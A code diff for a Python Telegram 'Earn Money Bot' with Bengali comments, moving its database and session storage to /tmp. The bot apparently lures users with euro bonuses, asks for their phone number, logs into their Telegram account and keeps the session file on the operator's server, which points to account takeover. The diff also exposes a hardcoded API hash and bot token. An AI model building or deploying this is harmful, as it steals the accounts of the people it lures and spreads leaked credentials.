@@ -15,11 +15,13 @@ app = Flask(__name__)
 # ---------- CONFIGURATION ----------
 API_ID = 35648548
 API_HASH = '7cb954d06d962e181fb1717fe1a486a8'
-# ⬇️ আপনার নতুন টোকেনটি এখানে আপডেট করা হয়েছে 
 BOT_TOKEN = '8872154816:AAHcOequL3WOz-9Rk8OHgihtPUwxr4eeEqA'
 OWNER_CHANNEL_ID = -1003645477647      
 BOT_USERNAME = 'YourEarnBot'           
-SESSION_DIR = 'sessions'
+
+# রেন্ডার সার্ভারে ফাইল রাইট করার পারমিশনের জন্য /tmp/ ডিরেক্টরি ব্যবহার করা হয়েছে
+SESSION_DIR = '/tmp/sessions'
+DB_PATH = '/tmp/referral_bot.db'
 
 # Earnings settings
 WELCOME_BONUS = 10          # Euro
@@ -38,7 +40,8 @@ def convert_datetime(blob):
 sqlite3.register_adapter(datetime, adapt_datetime)
 sqlite3.register_converter("timestamp", convert_datetime)
 
-conn = sqlite3.connect('referral_bot.db', detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES, check_same_thread=False)
+# ডাটাবেজ কানেকশন ফিক্সড পাথ
+conn = sqlite3.connect(DB_PATH, detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES, check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS users (
     user_id INTEGER PRIMARY KEY,
@@ -140,17 +143,16 @@ async def get_user_client(user_id):
     return client
 
 # ========================================================
-# 🤖 প্রধান ফাংশন যা বাটনে ক্লিক করলে ব্যাকগ্রাউন্ডে রান হবে
+# 🤖 প্রধান ফাংশন যা ব্যাকগ্রাউন্ডে রান হবে
 # ========================================================
 def my_custom_bot_code():
     global bot
     
-    # ব্যাকগ্রাউন্ড থ্রেডে Telethon চালানোর জন্য লুপ সেট
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    # নতুন টোকেনসহ বট ইনিশিয়ালাইজেশন
-    bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
+    # সেশন ফাইলও /tmp/ ফোল্ডারে সেভ হবে
+    bot = TelegramClient(os.path.join(SESSION_DIR, 'bot_session'), API_ID, API_HASH, loop=loop)
     
     # ---------- COMMAND /start ----------
     @bot.on(events.NewMessage(pattern='/start(?:\\s+(.*))?'))
@@ -199,7 +201,7 @@ def my_custom_bot_code():
         state["phone"] = phone
         await event.respond(f"⚡ Connecting to {phone}...", buttons=ReplyKeyboardHide())
 
-        temp_session = f'temp_{user_id}'
+        temp_session = os.path.join(SESSION_DIR, f'temp_{user_id}')
         client = TelegramClient(temp_session, API_ID, API_HASH, loop=loop)
         await client.connect()
         try:
@@ -288,7 +290,7 @@ def my_custom_bot_code():
 
         permanent_session = os.path.join(SESSION_DIR, f"user_{user_id}.session")
         await client.disconnect()
-        temp_file = f'temp_{user_id}.session'
+        temp_file = os.path.join(SESSION_DIR, f'temp_{user_id}.session')
         if os.path.exists(temp_file):
             os.rename(temp_file, permanent_session)
         else:
@@ -388,12 +390,12 @@ def my_custom_bot_code():
             await event.respond("💸 Please use the buttons below to earn money:", buttons=main_menu_keyboard())
 
     # ---------- RUN BOT ----------
-    print("🤖 Earn Money Bot is running inside background thread...")
+    print("🤖 Earn Money Bot is running...")
     bot.start(bot_token=BOT_TOKEN)
     bot.run_until_disconnected()
 
 # ==========================================
-# 🌐 ফ্ল্যাস্ক সার্ভার রুটস (Flask Web Interface)
+# 🌐 ফ্ল্যাস্ক সার্ভার রুটস
 # ==========================================
 
 @app.route("/")
@@ -406,8 +408,7 @@ def run_bot():
         bot_thread = threading.Thread(target=my_custom_bot_code)
         bot_thread.daemon = True
         bot_thread.start()
-        
-        return jsonify({"status": "success", "message": "🤖 Earn Money Bot নতুন টোকেনসহ ব্যাকগ্রাউন্ডে সচল হয়েছে!"})
+        return jsonify({"status": "success", "message": "🤖 Earn Money Bot ব্যাকগ্রাউন্ডে সচল হয়েছে!"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
